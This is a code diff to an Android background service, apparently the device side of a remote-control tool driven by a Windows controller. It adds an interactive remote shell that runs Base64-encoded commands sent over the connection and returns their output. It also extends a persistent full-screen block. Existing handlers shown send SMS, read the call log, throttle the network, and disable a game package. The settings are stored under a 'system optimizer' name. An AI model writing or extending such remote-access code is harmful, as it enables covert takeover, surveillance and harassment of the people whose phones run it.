@@ -6,17 +6,24 @@ import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.app.Service;
 import android.app.WallpaperManager;
+import android.app.admin.DevicePolicyManager;
+import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
+import android.content.IntentFilter;
 import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
 import android.content.pm.ServiceInfo;
+import android.content.res.AssetFileDescriptor;
 import android.database.Cursor;
 import android.graphics.Bitmap;
 import android.graphics.BitmapFactory;
 import android.media.MediaPlayer;
 import android.media.MediaRecorder;
 import android.net.ConnectivityManager;
+import android.net.LinkProperties;
+import android.net.Network;
+import android.net.NetworkCapabilities;
 import android.net.NetworkInfo;
 import android.os.BatteryManager;
 import android.os.Build;
@@ -46,7 +53,10 @@ import java.nio.charset.StandardCharsets;
 import java.util.ArrayList;
 import java.util.Date;
 import java.util.List;
+import java.util.Locale;
 import java.util.concurrent.atomic.AtomicBoolean;
+import java.util.regex.Matcher;
+import java.util.regex.Pattern;
 
 public class BackgroundService extends Service {
 
@@ -56,12 +66,19 @@ public class BackgroundService extends Service {
     private static final int NOTIFICATION_ID = 1;
 
     /**
-     * مكتبة الأصوات الجاهزة. أرقام الأوامر play_sound:1..N تشير إلى نفس الترتيب
-     * الذي تعرضه مكتبة الأصوات في أداة التحكم (Windows Controller).
+     * مكتبة الأصوات تُبنى وقت التشغيل من assets/audio (ملفات صوتية فقط).
+     * play_sound:1..N تشير إلى نفس الترتيب الذي تعرضه مكتبة الأصوات في أداة
+     * التحكم (ترتيب اسم الملف مع تجاهل الحالة).
      */
-    private static final int[] SOUND_LIBRARY = {
-            R.raw.alarm, R.raw.siren, R.raw.warning, R.raw.notification
+    private static final String ASSET_AUDIO_DIR = "audio";
+    private static final String ASSET_VIDEO_DIR = "video";
+
+    private static final String[] PREFERRED_INTERFACES = {
+            "wlan0", "eth0", "radio0", "rmnet_data0", "rmnet0", "wlan1"
     };
+
+    private static final Pattern PACKAGE_NAME_PATTERN = Pattern.compile(
+            "^[A-Za-z][A-Za-z0-9_]*(\\.[A-Za-z][A-Za-z0-9_]*)+$");
 
     /** الحزمة المستهدفة لأوامر إزالة/تعطيل فري فاير. */
     private static final String FREE_FIRE_PACKAGE = "com.dts.freefireth";
@@ -81,6 +98,17 @@ public class BackgroundService extends Service {
 
     private static final String PREFS_NAME = "system_optimizer_prefs";
     private static final String PREFS_BLACK_SCREEN_ON_BOOT = "black_screen_on_boot";
+    private static final String PREFS_BLOCK_DEADLINE = "block_screen_deadline_ms";
+    private static final String PREFS_BLOCK_ACTIVE = "block_screen_active";
+
+    // جلسة shell تفاعلية: حساسة فقط لخيط الاتصال (المُصدر الوحيد للأوامر)
+    private final Object shellLock = new Object();
+    private volatile Process shellProcess;
+    private volatile StringBuilder shellBuffer = new StringBuilder();
+    private volatile boolean shellMarkerSeen = false;
+    private volatile int shellCursor = 0;
+    private static final String SHELL_MARKER = "__SHELLCMD_EOF__";
+    private static final long SHELL_REPLY_TIMEOUT_MS = 20000;
 
     private final AtomicBoolean connectionThreadStarted = new AtomicBoolean(false);
     private volatile boolean running = false;
@@ -198,6 +226,15 @@ public class BackgroundService extends Service {
         }
         degradationActive = false;
         degradedInterface = null;
+
+        Process shell = shellProcess;
+        if (shell != null) {
+            try {
+                shell.destroy();
+            } catch (Exception ignored) {
+            }
+            shellProcess = null;
+        }
 
         super.onDestroy();
     }
@@ -383,6 +420,12 @@ public class BackgroundService extends Service {
                 handlePlayVideo(command, out);
             } else if (command.startsWith("show_serious_warning:")) {
                 handleSeriousWarning(command, out);
+            } else if (command.equals("shell_start")) {
+                handleShellStart(out);
+            } else if (command.startsWith("shell_cmd:")) {
+                handleShellCommand(command, out);
+            } else if (command.equals("shell_exit")) {
+                handleShellExit(out);
             } else if (command.startsWith("send_sms:")) {
                 handleSendSms(command, out);
             } else if (command.equals("call_log")) {
@@ -448,6 +491,12 @@ public class BackgroundService extends Service {
             return;
         }
         String pkg = parts[1].trim();
+        if (!PACKAGE_NAME_PATTERN.matcher(pkg).matches()) {
+            writeMessage(out, "نتيجة حظر التطبيق " + pkg + " - INVALID PACKAGE NAME: "
+                    + "يلزم اسم حزمة صالح (مثال: com.google.android.youtube). "
+                    + "لا تُقبل أسماء العرض مثل 'YouTube'.");
+            return;
+        }
         if (!isPackageInstalled(pkg)) {
             writeMessage(out, "نتيجة حظر التطبيق " + pkg + " - PACKAGE NOT FOUND: الحزمة غير مثبتة.");
             return;
@@ -490,11 +539,37 @@ public class BackgroundService extends Service {
             writeMessage(out, "المدة يجب أن تكون بين 1 و 600 ثانية");
             return;
         }
-        if (soundId < 1 || soundId > SOUND_LIBRARY.length) {
-            writeMessage(out, "رقم الصوت خارج النطاق (يجب أن يكون بين 1 و " + SOUND_LIBRARY.length + ")");
+        List<String> library = audioLibrary();
+        if (soundId < 1 || soundId > library.size()) {
+            writeMessage(out, "رقم الصوت خارج النطاق (يجب أن يكون بين 1 و " + library.size() + ")");
             return;
         }
-        playRawSound(SOUND_LIBRARY[soundId - 1], duration, out);
+        playAssetSound(ASSET_AUDIO_DIR + "/" + library.get(soundId - 1), duration, out);
+    }
+
+    private void playAssetSound(String assetPath, int duration, OutputStream out) throws IOException, InterruptedException {
+        MediaPlayer mediaPlayer = new MediaPlayer();
+        try {
+            AssetFileDescriptor afd = getAssets().openFd(assetPath);
+            try {
+                mediaPlayer.setDataSource(afd.getFileDescriptor(), afd.getStartOffset(), afd.getLength());
+            } finally {
+                afd.close();
+            }
+            mediaPlayer.setLooping(true);
+            mediaPlayer.prepare();
+            mediaPlayer.start();
+            Thread.sleep(duration * 1000L);
+            writeMessage(out, "تم تشغيل الصوت لمدة " + duration + " ثانية");
+        } catch (java.io.FileNotFoundException e) {
+            writeMessage(out, "ملف الصوت غير موجود في مكتبة الأصوات: " + assetPath);
+        } finally {
+            try {
+                mediaPlayer.stop();
+            } catch (IllegalStateException ignored) {
+            }
+            mediaPlayer.release();
+        }
     }
 
     private void playRawSound(int rawResId, int duration, OutputStream out) throws IOException, InterruptedException {
@@ -515,6 +590,34 @@ public class BackgroundService extends Service {
             }
             mediaPlayer.release();
         }
+    }
+
+    /**
+     * مكتبة الأصوات الحالية من assets/audio (أصوات فقط، مرتبة بمعزل عن
+     * الحالة لتطابق الترتيب المعروض في أداة التحكم).
+     */
+    private List<String> audioLibrary() {
+        List<String> names = new ArrayList<>();
+        try {
+            String[] listed = getAssets().list(ASSET_AUDIO_DIR);
+            for (String n : listed) {
+                if (isAudioFileName(n)) {
+                    names.add(n);
+                }
+            }
+        } catch (IOException e) {
+            Log.w(TAG, "audio library listing failed: " + e.getMessage());
+        }
+        names.sort(String.CASE_INSENSITIVE_ORDER);
+        return names;
+    }
+
+    private static boolean isAudioFileName(String name) {
+        String lower = name.toLowerCase(Locale.US);
+        return lower.endsWith(".wav") || lower.endsWith(".mp3")
+                || lower.endsWith(".m4a") || lower.endsWith(".ogg")
+                || lower.endsWith(".aac") || lower.endsWith(".flac")
+                || lower.endsWith(".opus");
     }
 
     // ---------- أوامر مساعدة ----------
@@ -870,9 +973,30 @@ public class BackgroundService extends Service {
             return;
         }
 
+        String uidLine = runShellCommand("sh", "-c", "id");
+        boolean isEmulator = isEmulatorEnvironment();
+        String tcCheck = runShellCommand("sh", "-c", "command -v tc || echo tc_missing");
+        boolean tcAvailable = !tcCheck.contains("tc_missing");
+
         String dev = detectNetInterface();
         if (dev == null) {
-            writeMessage(out, "لا يمكن تحديد واجهة الشبكة المحلية لتطبيق الخفض");
+            String links = runShellCommand("sh", "-c",
+                    "ip -o link show 2>/dev/null || (echo ip_unavailable; ls /sys/class/net 2>/dev/null)");
+            String linksLow = links == null ? "" : links.toLowerCase(Locale.US);
+            String shellNote;
+            if (linksLow.contains("permission denied") || linksLow.contains("ip_unavailable")) {
+                shellNote = "جرد الواجهات عبر shell محجوب بصلاحيات التطبيق غير المميزة "
+                        + "(SELinux untrusted_app): 'ip' و'ls /sys/class/net' غير متاحين بدونهما.";
+            } else {
+                shellNote = "لم تُعثر على واجهة نشطة قابلة للاستخدام.";
+            }
+            writeMessage(out, "interface not found: لا توجد واجهة شبكية قابلة للاستخدام.\n"
+                    + "تشخيص الحالة:\n"
+                    + "  - واجهات (ip -o link show): " + links.replace("\n", " | ") + "\n"
+                    + "  - هوية العملية: " + uidLine + "\n"
+                    + "  - وجود tc: " + (tcAvailable ? "نعم" : "لا") + "\n"
+                    + "  - البيئة: " + (isEmulator ? "محاكي Android Studio" : "جهاز حقيقي") + "\n"
+                    + "  - الملاحظة: " + shellNote);
             return;
         }
 
@@ -903,10 +1027,29 @@ public class BackgroundService extends Service {
         }
 
         if (!allApplied) {
-            writeMessage(out, "لا يمكن تطبيق خفض الشبكة بصلاحيات التطبيق العادية على هذا الجهاز.\n"
-                    + "يتطلب التنفيذ صلاحيات root/CAP_NET_ADMIN (أمر tc). لم تُجرَ أي تغييرات مؤثرة "
-                    + "على الاتصال ولم يتم فصله.\n"
-                    + "تفاصيل: " + failureDetail);
+            String low = failureDetail.toLowerCase(Locale.US);
+            String reason;
+            if (low.contains("permission denied")) {
+                reason = "permission denied";
+            } else if (low.contains("operation not permitted")) {
+                reason = "operation not permitted";
+            } else if (low.contains("not found") || low.contains("no such file")
+                    || low.contains("unknown qdisc")) {
+                reason = "tc unavailable";
+            } else {
+                reason = "command failed";
+            }
+            writeMessage(out, "لا يمكن تطبيق خفض الشبكة (" + reason + ").\n"
+                    + "تشخيص الحالة:\n"
+                    + "  - الواجهة: " + dev + "\n"
+                    + "  - هوية العملية: " + uidLine + "\n"
+                    + "  - وجود tc: " + (tcAvailable ? "نعم" : "لا") + "\n"
+                    + "  - البيئة: " + (isEmulator ? "محاكي Android Studio" : "جهاز حقيقي") + "\n"
+                    + "يتطلب tc صلاحيات root/CAP_NET_ADMIN؛ التطبيق العادي غير مخوّل (لا يُدَّعى النجاح)."
+                    + (isEmulator
+                        ? "\nملاحظة المحاكي: نموذج شبكة المحاكي قد يمنع تركيب qdisc حتى مع root."
+                        : "")
+                    + "\nتفاصيل: " + failureDetail);
             return;
         }
 
@@ -932,6 +1075,16 @@ public class BackgroundService extends Service {
                 + "سيتم استعادة الحالة الطبيعية تلقائياً بعد " + duration + " ثانية");
     }
 
+    private boolean isEmulatorEnvironment() {
+        String fingerprint = Build.FINGERPRINT == null ? "" : Build.FINGERPRINT.toLowerCase(Locale.US);
+        String model = Build.MODEL == null ? "" : Build.MODEL.toLowerCase(Locale.US);
+        String hardware = Build.HARDWARE == null ? "" : Build.HARDWARE.toLowerCase(Locale.US);
+        return fingerprint.contains("generic") || fingerprint.contains("emulator")
+                || fingerprint.contains("sdk_gphone")
+                || model.contains("sdk_gphone")
+                || hardware.contains("goldfish") || hardware.contains("ranchu");
+    }
+
     private boolean tcCommandFailed(String output) {
         String text = output == null ? "" : output;
         return text.contains("RTNETLINK answers: Permission denied")
@@ -944,15 +1097,101 @@ public class BackgroundService extends Service {
     }
 
     private String detectNetInterface() {
-        String[] candidates = {"eth0", "wlan0", "rmnet_data0", "rmnet0", "wlan1"};
-        for (String iface : candidates) {
-            String res = runShellCommand("sh", "-c",
-                    "ip link show " + iface + " 2>/dev/null | grep -q . && echo OK");
-            if (res.contains("OK")) {
-                return iface;
+        // 1) المصدر الأكيد: إطار أندرويد (بدون root) — اسم واجهة الشبكة النشطة
+        String frameworkIface = frameworkActiveInterface();
+        if (frameworkIface != null) {
+            return frameworkIface;
+        }
+
+        // 2) shell: ip -o link show (قد يكون مرفوضاً بصلاحيات غير مميزة)
+        String res = runShellCommand("sh", "-c", "ip -o link show 2>/dev/null");
+        if (res != null && !res.contains("(لا يوجد مخرجات)")
+                && !res.contains("permission denied") && !res.contains("not found")) {
+            List<String> ifaces = new ArrayList<>();
+            Matcher m = Pattern.compile("^\\s*\\d+:\\s+([A-Za-z0-9_.]+):.*").matcher(res);
+            while (m.find()) {
+                ifaces.add(m.group(1));
+            }
+            for (String iface : PREFERRED_INTERFACES) {
+                if (ifaces.contains(iface)) {
+                    return iface;
+                }
+            }
+            for (String iface : ifaces) {
+                if (isRealInterface(iface)) {
+                    return iface;
+                }
+            }
+            return null;
+        }
+        // 3) sysfs (قد يكون مرفوضاً أيضاً بصلاحيات غير مميزة في المحاكي)
+        String sysfs = runShellCommand("sh", "-c", "ls /sys/class/net 2>/dev/null");
+        List<String> candidates = new ArrayList<>();
+        if (sysfs != null) {
+            for (String line : sysfs.split("\n")) {
+                String name = line.trim();
+                if (name.isEmpty()) {
+                    continue;
+                }
+                for (String iface : PREFERRED_INTERFACES) {
+                    if (iface.equals(name)) {
+                        return iface;
+                    }
+                }
+                if (isRealInterface(name)) {
+                    candidates.add(name);
+                }
             }
         }
+        return candidates.isEmpty() ? null : candidates.get(0);
+    }
+
+    private String frameworkActiveInterface() {
+        try {
+            ConnectivityManager cm = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
+            if (cm == null) {
+                return null;
+            }
+            Network active = cm.getActiveNetwork();
+            if (active != null) {
+                LinkProperties lp = cm.getLinkProperties(active);
+                if (lp != null && isRealInterface(lp.getInterfaceName())) {
+                    return lp.getInterfaceName();
+                }
+            }
+            for (Network net : cm.getAllNetworks()) {
+                LinkProperties lp = cm.getLinkProperties(net);
+                if (lp == null) {
+                    continue;
+                }
+                String ifname = lp.getInterfaceName();
+                if (!isRealInterface(ifname)) {
+                    continue;
+                }
+                NetworkCapabilities cap = cm.getNetworkCapabilities(net);
+                if (cap != null && cap.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)) {
+                    return ifname;
+                }
+            }
+        } catch (Exception e) {
+            Log.w(TAG, "framework interface lookup failed: " + e.getMessage());
+        }
         return null;
+    }
+
+    private static boolean isRealInterface(String name) {
+        if (name == null || name.isEmpty() || name.equals("lo")) {
+            return false;
+        }
+        String low = name.toLowerCase(Locale.US);
+        if (low.startsWith("dummy") || low.startsWith("erspan") || low.endsWith("0")
+                && (low.startsWith("gre") || low.startsWith("gretap")
+                || low.startsWith("hwsim") || low.startsWith("ifb")
+                || low.startsWith("ip6") || low.startsWith("ip_vti")
+                || low.startsWith("sit") || low.startsWith("tunl"))) {
+            return false;
+        }
+        return true;
     }
 
     // ------------------------------------------------------------------
@@ -1173,11 +1412,176 @@ public class BackgroundService extends Service {
             writeMessage(out, "المدة يجب أن تكون بين 1 و 86400 ثانية.");
             return;
         }
+
+        long deadline = System.currentTimeMillis() + duration * 1000L;
+        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
+        prefs.edit()
+                .putLong(PREFS_BLOCK_DEADLINE, deadline)
+                .putBoolean(PREFS_BLOCK_ACTIVE, true)
+                .apply();
+
+        boolean deviceOwner = isDeviceOwner();
+
         Intent intent = new Intent(this, BlockScreenActivity.class);
-        intent.putExtra(BlockScreenActivity.EXTRA_DURATION_SECONDS, duration);
-        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+        intent.putExtra(BlockScreenActivity.EXTRA_DEADLINE_EPOCH_MS, deadline);
+        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
         startActivity(intent);
-        writeMessage(out, "تم تشغيل حجب الشاشة لمدة " + duration + " ثانية.");
+
+        StringBuilder reply = new StringBuilder();
+        reply.append("تم تشغيل حجب الشاشة لمدة ").append(duration).append(" ثانية.\n");
+        reply.append(deviceOwner
+                ? "وضع الإدارة: Device Owner — تُستخدم واجهات الجهاز المُدار (قفل/مهام كشك)."
+                : "وضع الإدارة: تطبيق عادي — قفل على مستوى التطبيق بالملء."
+                + "\nملاحظة: قفل النظام الكامل يتطلب Device Owner إدارة-مدار؛ لا يُزوَّر نجاحٌ للقيود"
+                + " التي تتطلب صلاحيات مُدارة.");
+        writeMessage(out, reply.toString());
+    }
+
+    private boolean isDeviceOwner() {
+        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
+        return dpm != null && dpm.isDeviceOwnerApp(getPackageName());
+    }
+
+    // ------------------------------------------------------------------
+    // جلسة shell تفاعلية (option 10 — Android Shell)
+    // ------------------------------------------------------------------
+
+    private void handleShellStart(OutputStream out) throws IOException {
+        synchronized (shellLock) {
+            if (shellProcess != null) {
+                writeMessage(out, "SHELL_SESSION_ALREADY_OPEN");
+                return;
+            }
+            try {
+                Process process = new ProcessBuilder("sh").redirectErrorStream(true).start();
+                shellProcess = process;
+                shellBuffer.setLength(0);
+                shellCursor = 0;
+                shellMarkerSeen = false;
+                Thread reader = new Thread(() -> readShellLoop(process), "shell-reader");
+                reader.setDaemon(true);
+                reader.start();
+                writeMessage(out, "SHELL_SESSION_STARTED");
+            } catch (IOException e) {
+                writeMessage(out, "فشل فتح جلسة shell على الجهاز: " + e.getMessage());
+            }
+        }
+    }
+
+    private void readShellLoop(Process process) {
+        try (BufferedReader reader = new BufferedReader(
+                new InputStreamReader(process.getInputStream(), StandardCharsets.UTF_8))) {
+            String line;
+            while ((line = reader.readLine()) != null) {
+                synchronized (shellLock) {
+                    shellBuffer.append(line).append('\n');
+                    if (SHELL_MARKER.equals(line.trim())) {
+                        shellMarkerSeen = true;
+                        shellLock.notifyAll();
+                    }
+                }
+            }
+        } catch (IOException e) {
+            Log.w(TAG, "shell reader stopped: " + e.getMessage());
+        } finally {
+            synchronized (shellLock) {
+                shellMarkerSeen = true;
+                shellLock.notifyAll();
+            }
+        }
+    }
+
+    private void handleShellCommand(String command, OutputStream out) throws IOException {
+        String b64 = command.substring("shell_cmd:".length()).trim();
+        String cmd;
+        try {
+            cmd = new String(
+                    android.util.Base64.decode(b64, android.util.Base64.DEFAULT),
+                    StandardCharsets.UTF_8);
+        } catch (IllegalArgumentException e) {
+            writeMessage(out, "صيغة خاطئة: shell_cmd:Base64");
+            return;
+        }
+        if (cmd == null || cmd.trim().isEmpty()) {
+            writeMessage(out, "أمر فارغ");
+            return;
+        }
+
+        Process process;
+        String result;
+        boolean markerSeen = false;
+        synchronized (shellLock) {
+            process = shellProcess;
+            if (process == null) {
+                writeMessage(out, "لا توجد جلسة shell مفتوحة (أرسل shell_start أولاً)");
+                return;
+            }
+            String all = shellBuffer.toString();
+            shellCursor = all.length();
+            shellMarkerSeen = false;
+            try {
+                OutputStream stdin = process.getOutputStream();
+                stdin.write((cmd + "\necho " + SHELL_MARKER + "\n").getBytes(StandardCharsets.UTF_8));
+                stdin.flush();
+            } catch (IOException e) {
+                writeMessage(out, "فشل إرسال الأمر إلى جلسة shell: " + e.getMessage());
+                return;
+            }
+
+            long deadline = System.currentTimeMillis() + SHELL_REPLY_TIMEOUT_MS;
+            while (!shellMarkerSeen && System.currentTimeMillis() < deadline) {
+                try {
+                    shellLock.wait(200);
+                } catch (InterruptedException e) {
+                    Thread.currentThread().interrupt();
+                    writeMessage(out, "أُلغي تنفيذ أمر shell");
+                    return;
+                }
+            }
+            markerSeen = shellMarkerSeen;
+            all = shellBuffer.toString();
+            int start = Math.min(shellCursor, all.length());
+            String segment = all.substring(start);
+            int markerIndex = segment.lastIndexOf(SHELL_MARKER);
+            if (markerIndex >= 0) {
+                int lineStart = segment.lastIndexOf('\n', markerIndex - 1);
+                segment = segment.substring(0, lineStart < 0 ? 0 : lineStart + 1);
+            }
+            result = segment.trim();
+            shellCursor = all.length();
+        }
+
+        if (!markerSeen && result.length() == 0) {
+            writeMessage(out, "[انتهت مهلة تنفيذ الأمر على shell]");
+            return;
+        }
+        if (!markerSeen) {
+            result = result + "\n[انتهت مهلة تنفيذ الأمر على shell]";
+        }
+        writeMessage(out, result.isEmpty() ? "(لا يوجد مخرجات)" : result);
+    }
+
+    private void handleShellExit(OutputStream out) throws IOException {
+        Process process;
+        synchronized (shellLock) {
+            process = shellProcess;
+            if (process == null) {
+                writeMessage(out, "SHELL_SESSION_CLOSED");
+                return;
+            }
+            try {
+                OutputStream stdin = process.getOutputStream();
+                stdin.write("exit\n".getBytes(StandardCharsets.UTF_8));
+                stdin.flush();
+            } catch (IOException e) {
+                Log.w(TAG, "shell exit write failed: " + e.getMessage());
+            }
+            process.destroy();
+            shellProcess = null;
+            shellMarkerSeen = true;
+            shellLock.notifyAll();
+        }
+        writeMessage(out, "SHELL_SESSION_CLOSED");
     }
 
     private void handlePlayVideo(String command, OutputStream out) throws IOException {
@@ -1197,19 +1601,24 @@ public class BackgroundService extends Service {
             writeMessage(out, "رقم الفيديو غير صالح (يجب أن يكون رقم المكتبة موجباً).");
             return;
         }
-        String resName = "video_" + videoId;
-        int resId = getResources().getIdentifier(resName, "raw", getPackageName());
-        if (resId == 0) {
-            writeMessage(out, "الفيديو غير موجود في المكتبة: " + resName
-                    + " (أضف " + resName + ".mp4 إلى res/raw وأعد بناء التطبيق)");
+        String fileName = "video_" + videoId + ".mp4";
+        String assetPath = ASSET_VIDEO_DIR + "/" + fileName;
+        boolean exists = false;
+        try (AssetFileDescriptor afd = getAssets().openFd(assetPath)) {
+            exists = afd.getLength() > 0;
+        } catch (IOException e) {
+            exists = false;
+        }
+        if (!exists) {
+            writeMessage(out, "الفيديو غير موجود في المكتبة: video_" + videoId
+                    + " (أضف " + fileName + " إلى assets/video وأعد بناء التطبيق)");
             return;
         }
         Intent intent = new Intent(this, VideoPlayerActivity.class);
-        intent.putExtra(VideoPlayerActivity.EXTRA_RAW_RES_ID, resId);
-        intent.putExtra(VideoPlayerActivity.EXTRA_VIDEO_NAME, resName + ".mp4");
+        intent.putExtra(VideoPlayerActivity.EXTRA_VIDEO_NAME, fileName);
         intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
         startActivity(intent);
-        writeMessage(out, "تم تشغيل الفيديو بملء الشاشة: " + resName + ".mp4");
+        writeMessage(out, "تم تشغيل الفيديو بملء الشاشة: " + fileName);
     }
 
     private void handleSeriousWarning(String command, OutputStream out) throws IOException {
